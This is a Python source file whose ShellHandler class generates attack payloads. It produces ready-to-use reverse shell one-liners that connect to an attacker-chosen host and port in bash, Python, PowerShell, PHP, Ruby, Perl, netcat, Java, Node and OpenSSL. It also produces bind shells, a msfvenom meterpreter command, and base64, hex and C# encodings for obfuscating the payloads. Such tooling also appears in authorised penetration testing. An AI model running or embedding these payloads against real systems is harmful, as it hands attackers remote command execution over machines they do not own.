"""Shell payload generation."""

from __future__ import annotations

import base64
import html
from typing import Optional


class ShellHandler:
    """Genera vari tipi di shell."""

    def generate(self, shell_type: str = "reverse",
                 lhost: str = "10.0.0.1", lport: int = 4444,
                 fmt: str = "bash", prepend: str = "",
                 stager: bool = False) -> str:
        """Genera shell payload."""

        generators = {
            "reverse": self._reverse_shell,
            "bind": self._bind_shell,
            "meterpreter": self._meterpreter_stager,
        }

        gen = generators.get(shell_type, self._reverse_shell)
        return gen(lhost, lport, fmt, prepend)

    def _reverse_shell(self, lhost: str, lport: int,
                       fmt: str, prepend: str) -> str:
        """Reverse shell payloads."""

        payloads = {
            "bash": f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',

            "python": f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',

            "python_windows": f'''python -c "import socket,subprocess,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"''',

            "powershell": f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',

            "php": f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',

            "ruby": f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',

            "perl": f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' ''',

            "nc": f'nc -e /bin/sh {lhost} {lport}',
            "nc_eav": f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',

            "java": f'''Runtime rt = Runtime.getRuntime();String[] cmd = {{"/bin/bash","-c","bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}};rt.exec(cmd);''',

            "node": f'''require('child_process').exec('nc -e /bin/sh {lhost} {lport}')''',

            "openssl": f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|openssl s_client -quiet -connect {lhost}:{lport} >/tmp/f 2>/dev/null''',
        }

        payload = payloads.get(fmt, payloads["bash"])

        if prepend:
            payload = f"{prepend} {payload}"

        return payload

    def _bind_shell(self, lhost: str, lport: int,
                    fmt: str, prepend: str) -> str:
        """Bind shell payloads."""

        payloads = {
            "bash": f'nc -lnvp {lport} -e /bin/sh',
            "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        }

        return payloads.get(fmt, payloads["bash"])

    def _meterpreter_stager(self, lhost: str, lport: int,
                            fmt: str, prepend: str) -> str:
        """Meterpreter stager generation."""
        return f"# Generate with: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {fmt}"

    def to_base64(self, payload: str) -> str:
        """Converti payload in base64."""
        return base64.b64encode(payload.encode()).decode()

    def to_hex(self, payload: str) -> str:
        """Converti payload in hex."""
        return payload.encode().hex()

    def to_csharp_bytearray(self, payload: str) -> str:
        """Converti per C# byte array."""
        b64 = self.to_base64(payload)
        return f'Convert.FromBase64String("{b64}")'
